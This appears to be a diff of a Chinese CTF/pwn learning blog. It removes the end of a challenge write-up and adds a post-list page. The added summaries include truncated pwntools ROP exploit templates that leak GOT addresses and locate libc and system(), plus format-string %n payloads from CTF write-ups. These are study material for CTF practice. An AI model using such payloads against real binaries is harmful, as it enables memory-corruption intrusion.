-<p><img src="/images/image-20210111203448731.png" alt="image-20210111203448731"></p>
-<p><img src="/images/image-20210111203523675.png" alt="image-20210111203523675"></p>
-<p>2.扔进IDA里面看一下</p>
-<p><img src="/images/image-20210111203716307.png" alt="image-20210111203716307"></p>
-<p>很明显的一个漏洞</p>
-<p><img src="/images/image-20210111203739487.png" alt="image-20210111203739487"></p>
-<p>调用了system函数，但是打印“hehehe”。去找了一下有没有“/bin/sh”，没找到。只能自己输入了</p>
-<h4 id="解题-8">解题：</h4>
-<p><img src="/images/image-20210111205429073.png" alt="image-20210111205429073"></p>
-<p><img src="/images/image-20210111205457550.png" alt="image-20210111205457550"></p>
-<p><img src="/images/image-20210111205518341.png" alt="image-20210111205518341"></p>
-<p>完成。</p>
+    <div class="collapse navbar-collapse lang-selector" id="top-nav-items">
+      <ul class="navbar-nav ml-auto">
+      
+      </ul>
+    </div>
+  </div>
+  
+  
+  
+</nav>
 
-                                </article>
-                            
-                        
-                    
 
-                </div>
 
+      
+      
+  
+  
+
+  <section class="sidebar-section" id="sidebar-section">
+    <div class="sidebar-holder">
+      <div class="sidebar" id="sidebar">
+        <form class="mx-auto" method="get" action="/search">
+          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
+        </form>
+        <div class="sidebar-tree">
+          <ul class="tree" id="tree">
+            <li id="list-heading"><a href="/posts" data-filter="all">Posts</a></li>
+            <div class="subtree">
                 
-<footer id="footer">
-    <p class="copyright">&copy; Design: <a href="https://github.com/d-asnaghi">d-asnaghi</a> and <a href="https://html5up.net">HTML5 UP</a>.</p>
-</footer>
 
+            </div>
+          </ul>
         </div>
+      </div>
+    </div>
+  </section>
+
+
+      
+      
+<section class="content-section" id="content-section">
+  <div class="content container-fluid" id="content">
+    <div class="container-fluid post-card-holder" id="post-card-holder">
+      
+      
+      
+        
+          <div class="post-card">
+  <a href="/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/" class="post-card-link">
+    <div class="card">
+      <div class="card-head">
+        <img class="card-img-top" src='/images/default-hero.jpg' alt="Hero Image">
+      </div>
+      <div class="card-body">
+        <h5 class="card-title">栈迁移原理</h5>
+        <p class="card-text post-summary">栈迁移原理 0x1利用前提 1.存在栈溢出
+2.栈溢出可利用空间过小，无法写入较长的ROP链
+0x2主要利用点 leave; ret; #其中leave -&gt;&gt; mov esp,ebp; #	pop ebp; #其中ret -&gt;&gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：
+其中leave_ret为代码leave;ret;地址。
+而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令
+当我们挨个去执行的时候会出现这样的情况
+首先是 mov esp,ebp 执行完以后变成了这个样子：
+然后 pop ebp 执行完后就是
+别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位
+这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处
+构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址
+其中
+为read的参数
+read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样
+首先是 mov esp,ebp 执行完成后效果如下：</p>
+      </div>
+      <div class="card-footer">
+        <span class="float-left">July 18, 2021</span>
+        <a
+        href="/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/"
+        class="float-right btn btn-outline-info btn-sm"
+        >Read</a
+        >
+      </div>
+    </div>
+  </a>
+</div>
+
+        
+      
+        
+          <div class="post-card">
+  <a href="/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" class="post-card-link">
+    <div class="card">
+      <div class="card-head">
+        <img class="card-img-top" src='/images/default-hero.jpg' alt="Hero Image">
+      </div>
+      <div class="card-body">
+        <h5 class="card-title">64位栈溢出rop模板(无PIE)</h5>
+        <p class="card-text post-summary">64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; #p = process(&#34;./&#34;) p = remote(&#34;&#34;,) elf = ELF(&#34;./&#34;) read_got = elf.got[&#39;read&#39;] puts_plt = elf.plt[&#39;puts&#39;] main_addr = pop_rdi = #************泄露got********* payload = b&#39;a&#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,&#39;b&#39;) p.sendline( payload) p.recvuntil(&#39;&#39;) read_addr = u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8, &#39;\x00&#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&#34;read&#34;,read_addr) offset = read_addr - libc.dump(&#34;read&#34;) sys_addr = offset + libc.</p>
+      </div>
+      <div class="card-footer">
+        <span class="float-left">July 12, 2021</span>
+        <a
+        href="/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+        class="float-right btn btn-outline-info btn-sm"
+        >Read</a
+        >
+      </div>
+    </div>
+  </a>
+</div>
+
+        
+      
+        
+          <div class="post-card">
+  <a href="/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" class="post-card-link">
+    <div class="card">
+      <div class="card-head">
+        <img class="card-img-top" src='/images/default-hero.jpg' alt="Hero Image">
+      </div>
+      <div class="card-body">
+        <h5 class="card-title">32位栈溢出rop模板</h5>
+        <p class="card-text post-summary">32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) + payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc.</p>
+      </div>
+      <div class="card-footer">
+        <span class="float-left">July 11, 2021</span>
+        <a
+        href="/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+        class="float-right btn btn-outline-info btn-sm"
+        >Read</a
+        >
+      </div>
+    </div>
+  </a>
+</div>
+
+        
+      
+        
+          <div class="post-card">
+  <a href="/posts/plt%E4%B8%8Egot/" class="post-card-link">
+    <div class="card">
+      <div class="card-head">
+        <img class="card-img-top" src='/images/default-hero.jpg' alt="Hero Image">
+      </div>
+      <div class="card-body">
+        <h5 class="card-title">Plt与got</h5>
+        <p class="card-text post-summary">plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。
+.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。
+.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。
+.plt.got 貌似没啥用。
+0x2 理解 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char **argv) { puts(&#34;Hello world!&#34;); puts(&#34;Hello CTF!&#34;) exit(0); } 当调用第一次puts时，流程如下
+第二次调用puts时，流程如下
+0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。
+.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。</p>
+      </div>
+      <div class="card-footer">
+        <span class="float-left">July 11, 2021</span>
+        <a
+        href="/posts/plt%E4%B8%8Egot/"
+        class="float-right btn btn-outline-info btn-sm"
+        >Read</a
+        >
+      </div>
+    </div>
+  </a>
+</div>
+
+        
+      
+        
+          <div class="post-card">
+  <a href="/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" class="post-card-link">
+    <div class="card">
+      <div class="card-head">
+        <img class="card-img-top" src='/images/default-hero.jpg' alt="Hero Image">
+      </div>
+      <div class="card-body">
+        <h5 class="card-title">攻防世界WP</h5>
+        <p class="card-text post-summary">攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的
+题目分析： nc链接，运行，拿到shell
+解题： 1.nc链接IP（端口是空格）
+2.ls查看文件，cat flag 获得flag
+题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用
+题目分析： 1.从题目描述来看，解题的关键是prinf
+2.查看文件格式，保护设置，运行一下
+发现是一个32位的文件，开启了NX、Stack保护
+这是程序的流程
+3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下
+这是一个高危漏洞！！！具体用法先放着，往下看。
+看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！
+而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。
+4.格式化字符串漏洞的简单运用
+%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表	示将0x64写入偏移10处保存的指针所指向的地址
+解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量
+输入aaaa，发现0x61616161（aaaa）偏移量为10
+2.编写脚本
+payload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里
+3.运行
+拿到falg
+4.注：
+还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'
+题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办
+题目分析： 1.从描述来看，关键在于“年龄”
+2.查看文件格式，保护设置，运行一下
+64位，开启了stack、NX保护。
+这是程序基本流程。
+3.扔到IDA中看一下
+答案就在这！！！
+整体看一下
+所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个
+漏洞……
+查看一下
+v4下面正好是v5，那就可以直接覆盖了
+解题： 解决。
+题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思
+题目分析： 1.题目描述貌似没啥用，不管了
+2.查看文件，保护，运行一下
+64位，开启了NX保护
+就一句话……</p>
+      </div>
+      <div class="card-footer">
+        <span class="float-left">July 7, 2021</span>
+        <a
+        href="/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/"
+        class="float-right btn btn-outline-info btn-sm"
+        >Read</a
+        >
+      </div>
+    </div>
+  </a>
+</div>
+
+        
+      
+    </div>
+    <div class="paginator">
+      
+    </div>
+  </div>
+</section>
+
+
+      
+       
+    </div>
 
     
-    <div id="bg"></div>
+    
 
-</body>
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+    
+  
+  
+
+  
+  
+  
+
+  <footer class="container-fluid text-center align-content-center footer pb-2">
+    <div class="container pt-5">
+      <div class="row text-left">
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Navigation</h5>
+          
+        </div>
+        
+        
+        
+        
+          
+          <div class="col-md-4 col-sm-12">
+            <p>Stay up to date with email notification</p>
+            
+             
+              <form>
+                <div class="form-group">
+                  <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email"/>
+                  <small id="emailHelp" class="form-text text-muted">By entering your email address, you agree to receive the newsletter of this website.</small>
+                </div>
+                <button type="submit" class="btn btn-info">Submit</button>
+              </form>
+            
+          </div>
+        
+      </div>
+    </div>
+    
+    
+    <hr />
+    <div class="container">
+      <div class="row text-left">
+        <div class="col-md-4">
+          <a id="theme" href="https://github.com/hossainemruz/toha" target="_blank" rel="noopener">
+            <img src="/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_2.png" alt="Toha Theme Logo">
+            Toha
+          </a>
+        </div>
+        <div class="col-md-4 text-center">© 2021 Copyright.</div>
+        <div class="col-md-4 text-right">
+          <a id="hugo" href="https://gohugo.io/" target="_blank" rel="noopener">Powered by
+          <img
+            src="/images/hugo-logo.svg"
+            alt="Hugo Logo"
+            height="18"
+          />
+          </a>
+        </div>
+      </div>
+    </div>
+    
+  </footer>
+
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<script type="text/javascript" src="/js/popper.min.js"></script>
+<script type="text/javascript" src="/js/bootstrap.min.js"></script>
+
+<script type="text/javascript" src="/js/navbar.js"></script>
+<script type="text/javascript" src="/js/plyr.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
 
 
     
-    <script src=https://shaodongshi.github.io/assets/js/jquery.min.js></script>
-    <script src=https://shaodongshi.github.io/assets/js/browser.min.js></script>
-    <script src=https://shaodongshi.github.io/assets/js/breakpoints.min.js></script>
-    <script src=https://shaodongshi.github.io/assets/js/util.js></script>
-    <script src=https://shaodongshi.github.io/assets/js/main.js></script>
+    
+    <script src="/js/list.js"></script>
 
+  </body>
 </html>
